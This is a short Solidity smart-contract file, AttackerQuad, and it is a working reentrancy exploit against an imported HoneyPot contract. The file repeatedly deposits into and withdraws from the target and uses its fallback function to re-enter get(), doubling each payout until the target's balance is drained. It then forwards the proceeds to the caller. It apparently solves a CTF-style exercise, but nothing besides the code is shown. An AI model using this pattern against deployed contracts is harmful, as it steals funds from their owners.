pragma solidity 0.4.24;

import "./HoneyPot.sol";

contract AttackerQuad {
    bool public attacking;

    function attack(address honeyPot) payable public {
        uint before = address(this).balance;
        uint bait;
        while (0 < honeyPot.balance && 40000 <= gasleft()) {
            if (honeyPot.balance < address(this).balance) {
                bait = honeyPot.balance;
            } else {
                bait = address(this).balance;
            }
            HoneyPot(honeyPot).put.value(bait)();
            HoneyPot(honeyPot).get();
        }
        require(address(this).balance > before);
        msg.sender.transfer(address(this).balance);
    }

    function() payable public {
        assembly {
            // The cheapest logging I could think of.
            log0(0, 0)
        }
        if (!attacking) {
            attacking = true;
            HoneyPot(msg.sender).get();
            attacking = false;
        }
    }
}